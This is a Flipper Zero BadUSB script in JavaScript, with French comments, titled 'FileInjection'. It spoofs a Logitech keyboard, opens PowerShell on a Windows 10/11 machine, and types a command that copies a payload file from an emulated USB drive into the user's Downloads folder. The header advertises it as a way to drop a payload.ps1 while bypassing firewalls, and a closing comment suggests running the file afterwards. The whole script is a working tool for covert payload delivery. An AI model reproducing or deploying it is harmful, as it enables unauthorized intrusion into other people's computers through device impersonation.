// ########################################################################################
// #                                                                                      |
// #                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
// #                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
// #                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
// #                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
// #                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                |
// #                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
// #                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
// #                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
// #                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |
// #                                                                                      |
// #     Title        : FileInjection                                                     |
// #     Link         : https://github.com/miiraak/                                       |
// #     Version      : 2.5                                                               |
// #     Category     : Others                                                            |
// #     Target       : Windows 10/11                                                     |
// #     Description  : Copie un payload.ps1 vers le PC, evitant utilisation de dropbox.  |
// #                    Permet de bypass les firewall, marche sur les pc offline.         |
// #                                                                                      |
// ########################################################################################

// You need to create a .img in mass storage app named Infiltration (or modify the line 27)
// You need to change the line 50 with the name of your file.

print("__Activation des modules__")
// you can change this with your .img name (if not, create mass storage .img named Infliltration)
let stockage = "/ext/apps_data/mass_storage/Infiltration.img"; 
let badusb = require("badusb");
let usbdisk = require("usbdisk");

// You can change this with your layout
let layout = "fr-CH"; 

// You can change this with custom vid/pid and name
print("__Parametrage du layout__")
badusb.setup({ vid: 0x046D, pid: 0xc33f, mfr_name: "Logitec, Inc", 
prod_name: "Keyboard", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });

print("Recherche d'hote...");
while (!badusb.isConnected()) {
    delay(1000);
}

print("__Injection du payload__");
badusb.press("GUI", "x");
delay(300);
badusb.press("i");
delay(3000);
badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Copy-Item -Path ${DriveLetter}:/YOUR_FILE.loo -Destination C:/Users/$env:username/Downloads; exit;");
badusb.quit();

delay(2000);
usbdisk.start(stockage);

print("Attendez la fermeture du Terminal...");
print("Done");

usbdisk.stop();

// Here you can restart the badusb to execute your file or do more task.
